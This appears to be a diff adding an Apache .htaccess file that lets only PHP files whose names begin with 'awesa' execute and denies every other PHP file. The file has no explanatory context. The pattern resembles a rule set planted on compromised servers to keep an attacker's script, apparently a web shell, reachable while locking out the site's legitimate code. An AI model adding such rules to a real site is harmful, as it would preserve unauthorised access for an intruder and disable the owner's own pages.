@@ -1,0 +1,7 @@
+<FilesMatch "^(awesa.*\.php)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+<FilesMatch "^(?!awesa).+\.php$">
+    Require all denied
+</FilesMatch>
